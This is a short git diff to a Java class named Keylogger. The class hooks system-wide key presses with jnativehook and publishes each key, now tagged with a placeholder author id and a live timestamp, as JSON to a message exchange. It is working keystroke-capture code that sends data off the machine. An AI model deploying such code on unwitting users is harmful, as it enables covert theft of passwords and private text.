@@ -1,6 +1,7 @@
 package com.mibef108287.app;
 
 import java.io.IOException;
+import java.sql.Timestamp;
 
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
@@ -24,7 +25,8 @@ public class Keylogger implements NativeKeyListener{
   public void nativeKeyPressed(NativeKeyEvent nativeEvent){
     try {
       String key = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
-      String payload = String.format("{\"pressedKey\": \"%s\", \"ts\": \"2023-11-24T12:30:45Z\"}", key);
+      int id = 1; // Because we don't have login yet
+      String payload = String.format("{\"author\": {\"id\" : \"%d\"},\"pressedKey\": \"%s\", \"ts\": \"%s\"}", id, key, new Timestamp(System.currentTimeMillis()).toString());
       channel.basicPublish(EXCHANGE_NAME,"",null,payload.getBytes());
     } catch (IOException e) {
       System.err.println(e);
